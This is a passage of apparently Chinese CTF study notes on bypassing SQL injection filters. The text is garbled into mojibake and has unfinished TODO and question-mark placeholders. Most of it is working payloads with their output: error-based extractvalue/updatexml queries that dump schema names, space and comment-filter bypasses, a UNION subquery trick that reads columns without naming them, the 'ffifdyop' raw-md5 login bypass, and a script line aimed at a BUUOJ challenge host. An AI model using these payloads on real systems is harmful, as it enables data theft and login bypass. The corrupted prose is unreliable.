ä¸å¹¸çš„æ˜¯ï¼Œ`LIMIT`å­å¥æ²¡æœ‰`LIMIT(1)`ã€`LIMIT(0),(1)`ã€`LIMIT(0,1)`ä¹‹ç±»çš„ç»•è¿‡æ–¹æ³•ï¼Œå¿…é¡»å¸¦ç©ºæ ¼ã€‚æ‰€ä»¥æ— æ³•é€šè¿‡`LIMIT`æŒ‡å®šè¾“å‡ºå“ªä¸€è¡Œçš„æ•°æ®

`left()`ä¸`right()`ä¼šåœ¨æ•°æ®åº“æœ‰å¤šè¡Œæ—¶è¿”å›å¤šè¡Œï¼Œéœ€è¦ç”¨`group_concat()`å˜æˆä¸€è¡Œï¼Œæ‰èƒ½ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

çˆ†æ•°æ®åº“åï¼š

```sql
?id=1'^extractvalue(1,concat(0x7e,(select(database()))))%23
```

çˆ†è¡¨åï¼š

```sql
?id=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('æ•°æ®åº“å')))))%23
```

çˆ†åˆ—åï¼š

```sql
?id=1'^extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('è¡¨å')))))%23
```

æˆ–è€…TODOï¼šï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ`select/**/*/**/from/**/users`



## Â§4.4 æˆªå–å­—ç¬¦ä¸²ç»•`substr()`ä¸`substring()`

ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥è¿ç®—ç¬¦`||`

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

```
mysql> SELECT * from users where id regexp('1');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 123      |
| 10 | admin2   | 123      |
| 11 | admin3   | 123      |
| 12 | dhakkan  | 123      |
| 14 | admin4   | 123      |
+----+----------+----------+
5 rows in set (0.00 sec)

mysql> SELECT * from users where id regexp('1') && username regexp('^a');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 10 | admin2   | 123      |
| 11 | admin3   | 123      |
| 14 | admin4   | 123      |
+----+----------+----------+

&&(column_name)regexp('^r')ç»•ç©ºæ ¼
æ³¨æ„æ˜¯ç»•æŠ¥é”™æ³¨å…¥çš„30å­—ç¬¦é™åˆ¶
(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1))#
```



## Â§4.5 å†…è”æ³¨é‡Šç»•ç©ºæ ¼

`select * from users`ä¸`select/**/*/**/from/**/users`çš„æ•ˆæœä¸€æ ·ï¼Œåªæ˜¯æŠŠç©ºæ ¼æ¢æˆäº†`/**/`è€Œå·²ã€‚



## Â§4.6 åˆæˆå­—ç¬¦

## Â§4.7 ç»•è¿‡æ³¨é‡Šç¬¦

è€ƒè™‘ä»¥ä¸‹è¯­å¥ï¼š`select * from users where id='$id' limit 0,1`ï¼Œç¦ç”¨æ‰€æœ‰æ³¨é‡Šç¬¦ã€‚

å¯ä»¥è€ƒè™‘Payloadä¸º`1' group by 2,'`ï¼Œå¾—åˆ°çš„SQLè¯­å¥ä¸º`select * from users where id='1' group by 2,'' limit 0,1`ã€‚è¿™é‡Œä¸ç”¨`order by`çˆ†åˆ—æ•°çš„åŸå› æ˜¯`group by`æ”¯æŒå¤šå‚æ•°ï¼Œå¯ä»¥é—­åˆæœ€åçš„å•å¼•å·ã€‚

## Â§4.8 ç»•è¿‡`information_schema`çˆ†åˆ—å

ä½¿ç”¨`mysql`æ•°æ®åº“çš„`innodb_index_stats`å’Œ `innodb_table_stats`ä¸¤å¼ è¡¨ã€‚

https://dba.stackexchange.com/questions/54608/innodb-error-table-mysql-innodb-table-stats-not-found-after-upgrade-to-mys

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿæ‰¾ä¸åˆ°è¿™å¼ è¡¨TODOï¼šï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

https://www.cnblogs.com/upfine/p/16496021.html

## Â§4.9 ç»•è¿‡åˆ—å

å‡è®¾`users`è¡¨å†…å«æœ‰`id`ã€`username`ã€`password`è¿™ä¸‰åˆ—ï¼ŒSQLè¯­å¥ä¸º`select * from users where username=$username`ï¼Œä½†æ˜¯`$username`è¿‡æ»¤äº†è¿™ä¸‰ä¸ªåˆ—åï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½å†`' and 1=0 union select group_concat('password'),2,3`ã€‚

### Â§4.9.1 å­æŸ¥è¯¢åˆ›å»ºæ–°åˆ—å

å½“æˆ‘ä»¬ä½¿ç”¨SELECTå­å¥ä¸”æœªæŒ‡å®šFROMå­å¥çš„æ—¶å€™ï¼ŒSQLå°†ä¼šæŠŠåˆ—åä¹Ÿä½œä¸ºè¿™ä¸€åˆ—çš„å†…å®¹ï¼š

```sql
mysql> select 'abc',123,000;
    +-----+-----+-----+
    | abc | 123 | 000 |
    +-----+-----+-----+
    | abc | 123 |   0 |
    +-----+-----+-----+
    1 row in set (0.00 sec)
```

åœ¨ä¿è¯åˆ—æ•°ç›¸åŒçš„å‰æä¸‹ï¼Œä½¿ç”¨UNIONå­å¥ä¸ä¼šæ”¹å˜è¿”å›ç»“æœçš„åˆ—åã€‚ä¸ºäº†è¿‡æ»¤æ‰ç¬¬ä¸€è¡Œæ— ç”¨çš„æ•°æ®ï¼Œæˆ‘ä»¬ä½¿ç”¨LIMITæˆ–OFFSETå­å¥ï¼š

```sql
mysql> select 'abc',123,000 union select * from users;
    +-----+----------+-------+
    | abc | 123      | 000   |
    +-----+----------+-------+
    | abc | 123      | 0     |
    | 1   | Dumb     | admin |
    | 2   | Angelina | root  |
    +-----+----------+-------+
    3 rows in set (0.00 sec)
    
mysql> select 'abc',123,000 union select * from users limit 1,999999; # è¿‡æ»¤ç¬¬0è¡Œ,å–åç»­è¶³å¤Ÿå¤šçš„è¡Œ
    +-----+----------+-------+
    | abc | 123      | 000   |
    +-----+----------+-------+
    | 1   | Dumb     | admin |
    | 2   | Angelina | root  |
    +-----+----------+-------+
    2 rows in set (0.00 sec)
    
mysql> select 'abc',123,000 union select * from users limit 999999 offset 1; # ä»1è¡Œå¼€å§‹ï¼Œåå–è¶³å¤Ÿå¤šçš„è¡Œ
    +-----+----------+-------+
    | abc | 123      | 000   |
    +-----+----------+-------+
    | 1   | Dumb     | admin |
    | 2   | Angelina | root  |
    +-----+----------+-------+
    2 rows in set (0.00 sec)
```

è¿™é‡Œæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†æƒ³è¦çš„æ•°æ®ï¼Œå¹¶ä¸”ç»•è¿‡äº†åˆ—åã€‚æ¥ä¸‹æ¥éœ€è¦å°†è¿™æ¬¡çš„è¿”å›ç»“æœä½œä¸ºå­æŸ¥è¯¢ï¼Œç”±å¤–å±‚çš„SELECTå­å¥ç­›é€‰æˆ‘ä»¬æƒ³è¦çš„å€¼ï¼š

```mysql
mysql> select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;
	# å¿…é¡»ç»™å­æŸ¥è¯¢æŒ‡å®šåˆ«åï¼Œè¿™é‡Œç”¨çš„åˆ«åæ˜¯aï¼Œå¦åˆ™æŠ¥é”™ï¼šERROR 1248 (42000): Every derived table must have its own alias
	# group_concatè°ƒç”¨æ•°å­—ç±»å‹çš„åˆ—åæ—¶å¿…é¡»åŠ åå¼•å·è¿›è¡Œè½¬ç½®ï¼Œå¦åˆ™åˆ—åä¼šè¢«è§£ææˆæ•°å­—å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯å¯¹åº”çš„åˆ—
    +-------------------+---------------------+------------------------+
    | group_concat(abc) | group_concat(`123`) | group_concat(`000`)    |
    +-------------------+---------------------+------------------------+
    | 1,2               | Dumb,Angelina       | admin,root             |
    +-------------------+---------------------+------------------------+
    1 row in set (0.00 sec)
```

æœ€ç»ˆæ„é€ Payloadï¼š`' and 1=0 union select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;# `

```sql
mysql> select * from users where username='' and 1=0 union select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;
    +-------------------+---------------------+------------------------+
    | group_concat(abc) | group_concat(`123`) | group_concat(`000`)    |
    +-------------------+---------------------+------------------------+
    | 1,2               | Dumb,Angelina       | admin,root             |
    +-------------------+---------------------+------------------------+
    1 row in set (0.00 sec)
```

## Â§4.10 åå¼•å·

åå¼•å·ç”¨äºåŒºåˆ†SQLçš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦ï¼Œåœ¨å„å¤§SQLæ•°æ®åº“ä¸­å‡é€‚ç”¨ã€‚å¦‚æœ`sleep(1)`è¢«å±è”½ï¼Œå¯ä»¥è¯•è¯•```sleep`(1)``ã€‚

# Â§5 PHPä¸SQLçš„ç»¼åˆBypass

## Â§5.1 PHPçš„`md5()`

[PHPå®˜æ–¹æ–‡æ¡£](https://www.php.net/manual/en/function.md5.php)å¯¹`md5()`çš„å®šä¹‰å¦‚ä¸‹ï¼š

> `md5(string $string, bool $binary = false): string`
>
> - string
>
>   å¾…åŠ å¯†çš„å­—ç¬¦ä¸²
>
> - binary
>
>   å¯é€‰ã€‚ä¸º`true`æ—¶è¿”å›16å­—èŠ‚çš„äºŒè¿›åˆ¶å½¢å¼ã€‚

å®¡è®¡ä»¥ä¸‹ä»£ç ï¼š

```php
$username = addslashes(......)
$password = md5(......,true);
$sql = "select * from users where username='$username' and password='$password'";
```

å½“`md5(...)`çš„å‰äº”ä¸ªå­—èŠ‚æ°å¥½ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼`\â€˜or\'[1-9]`ï¼Œä¸”åé¢çš„11ä¸ªå­—èŠ‚æ²¡æœ‰`'`æ—¶ï¼Œæ‹¼æ¥å½¢æˆçš„SQLè¯­å¥ä¸º`select * from users where username='...' and password=''or'???????????'`ã€‚

SQLåœ¨å°†å­—ç¬¦ä¸²ä½œä¸ºå¸ƒå°”å€¼è¿›è¡Œå¤„ç†æ—¶ï¼Œä¼šå°è¯•å°†å‰å‡ ä¸ªæ•°å­—å­—ç¬¦è½¬åŒ–ä¸ºæ•´æ•°ï¼ˆå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯æ•°å­—ï¼Œåˆ™ä¼šè¢«å½“ä½œ`false`ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ª`Truncated incorrect INTEGER value: '...'`çš„è­¦å‘Šï¼‰ã€‚è½¬åŒ–ä¸ºæ•´æ•°åï¼Œå¦‚æœå…¶ä¸º0ï¼Œåˆ™è¢«å½“ä½œ`false`ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ª`Truncated incorrect INTEGER value: '...'`çš„è­¦å‘Šï¼Œåä¹‹ä¸º`true`ï¼š

```mysql
mysql> select * from users where password=''or'1abc';
......
13 rows in set, 1 warning (0.00 sec)

mysql> select * from users where password=''or'0abc';
Empty set, 1 warning (0.00 sec)

mysql> select * from users where password=''or'000abc';
Empty set, 1 warning (0.00 sec)

mysql> select * from users where password=''or'001abc';
......
13 rows in set, 1 warning (0.00 sec)
```

ç»è¿‡ç©·ä¸¾ï¼Œ`ffifdyop`çš„MD5å€¼æ°å¥½æ»¡è¶³ä»¥ä¸Šæ‰€æœ‰æ¡ä»¶ï¼Œå¯ä»¥ç»•è¿‡ç™»å½•ç³»ç»Ÿçš„å¯†ç æ ¡éªŒã€‚

```php
$md5 = md5("ffifdyop",true); # 'or'6Ã‰].Ã©!r,Ã¹Ã­b.
$sql = "select * from `admin` where password='$md5'";
echo $sql;
```























è¿‡æ»¤å•å¼•å·æ—¶é—­åˆå•å¼•å·ï¼š`select * from users where username='123' and passwd='123'`ï¼Œè®©`username=\`ä½¿åé¢çš„`'`è¢«è½¬ä¹‰ï¼Œå†ç”±`passwd=...;`å³å¯é—­åˆå•å¼•å·ï¼š

```python
URL_PREFIX = "http://703919f8-2d7e-4009-83cf-425433e65a3d.node4.buuoj.cn:81"
print(SQL_TEMPLATE.format('\\','||/**/passwd/**/regexp/**/"^a";%00'))
	# select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/"^a";%00'
```





SQL`%00`ä¼šè®¤ä¸ºè¿™ä¸ºå½“å‰å‘½ä»¤ç»“å°¾ï¼Œå¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚`....;%00....`ï¼Œå¯ä»£æ›¿æ³¨é‡Šç¬¦



Pythonå¤„ç†ç‰¹æ®Šå­—ç¬¦æ—¶ä¼šè‡ªåŠ¨URLç¼–ç ï¼Œä¾‹å¦‚ï¼š

```python
data = "%00" # Ã—
data = chr(0) # âˆš
```

